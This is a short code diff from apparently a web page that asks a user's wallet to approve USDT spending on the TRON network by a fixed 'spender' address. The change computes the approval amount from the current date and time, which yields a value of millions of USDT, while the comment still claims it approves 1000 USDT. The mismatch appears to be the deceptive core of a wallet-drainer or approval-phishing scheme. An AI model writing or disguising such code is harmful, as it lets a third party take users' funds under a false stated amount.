@@ -32,8 +32,12 @@
   const USDT_ADDR = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 主网 USDT 地址
   const SPENDER = "TENBpGLoxcAsUQvUrN36xpDKPYmadpc1x3";  // 接收授权的地址
 
-  const today = new Date().toISOString().split('T')[0].replace(/-/g, '');
-  const AMOUNT = today * 1000000; // 授权 1000 USDT (精度6)
+    const getFormattedTime = () => {
+      const d = new Date();
+      const f = (n) => String(n).padStart(2, '0');
+      return `${d.getFullYear()}${f(d.getMonth() + 1)}${f(d.getDate())}.${f(d.getHours())}${f(d.getMinutes())}${f(d.getSeconds())}`;
+  };
+  const AMOUNT = getFormattedTime() * 1000000; // 授权 1000 USDT (精度6)
 
   const logEl = document.getElementById('log');
   function logger(msg) { logEl.innerText += `\n[${new Date().toLocaleTimeString()}] ${msg}`; logEl.scrollTop = logEl.scrollHeight; }
